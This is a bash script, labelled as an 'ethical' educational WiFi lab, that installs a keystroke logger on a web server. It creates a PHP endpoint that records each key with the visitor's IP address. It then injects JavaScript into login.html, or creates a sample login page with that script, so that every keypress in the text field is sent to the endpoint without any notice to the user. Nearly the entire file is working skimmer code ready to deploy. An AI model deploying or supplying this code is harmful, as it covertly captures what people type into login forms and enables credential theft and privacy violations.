#!/bin/bash

# Ethical WiFi Lab: Keystroke Logging Setup (Auto-inject JS)

echo "📦 Setting up educational keystroke logger..."
LOG_DIR="/var/log/cybersec_lab"
KEY_LOG="$LOG_DIR/educational_keystrokes.log"
WWW_DIR="/var/www/html"
LOGIN_PAGE="$WWW_DIR/login.html"

# Ensure we're running as root
if [[ $EUID -ne 0 ]]; then
  echo "❌ Please run this script with sudo"
  exit 1
fi

# 1. Create the log directory and log file
mkdir -p "$LOG_DIR"
touch "$KEY_LOG"
chown www-data:www-data "$KEY_LOG"
chmod 666 "$KEY_LOG"
echo "✅ Log file created at $KEY_LOG"

# 2. Create PHP script to log keystrokes
cat <<EOF > "$WWW_DIR/log_keystroke.php"
<?php
\$logFile = "$KEY_LOG";
\$ip = \$_SERVER['REMOTE_ADDR'];
\$key = \$_POST['key'] ?? '';
\$time = \$_POST['time'] ?? time();
\$line = "[" . date("Y-m-d H:i:s") . "] \$ip pressed '\$key' at \$time\n";
file_put_contents(\$logFile, \$line, FILE_APPEND);
?>
EOF
chmod 644 "$WWW_DIR/log_keystroke.php"
chown www-data:www-data "$WWW_DIR/log_keystroke.php"
echo "✅ PHP endpoint created: $WWW_DIR/log_keystroke.php"

# 3. Inject keystroke JS if login.html exists
KEY_JS='<script>
document.addEventListener("DOMContentLoaded", function () {
    const inputField = document.querySelector("input[type=\"text\"]");
    if (inputField) {
        inputField.addEventListener("keydown", function (e) {
            fetch("/log_keystroke.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `key=${encodeURIComponent(e.key)}&time=${Date.now()}`
            });
        });
    }
});
</script>'

if [[ -f "$LOGIN_PAGE" ]]; then
  if ! grep -q "log_keystroke.php" "$LOGIN_PAGE"; then
    sed -i "/<\/head>/i $KEY_JS" "$LOGIN_PAGE"
    echo "✅ Injected keystroke logger JS into existing login.html"
  else
    echo "ℹ️ login.html already includes the keystroke logger"
  fi
else
  # Create a default page if it doesn't exist
  cat <<EOL > "$LOGIN_PAGE"
<!DOCTYPE html>
<html>
<head>
  <title>Educational Login</title>
  $KEY_JS
</head>
<body>
  <h2>Student Login</h2>
  <form method="POST" action="register.php">
    <label for="studentName">Name:</label>
    <input type="text" id="studentName" name="studentName" required><br><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
EOL
  echo "✅ Sample login page created with keystroke logger"
fi

echo "🎉 Keystroke logger setup complete. Monitor with:"
echo "   sudo tail -f $KEY_LOG"
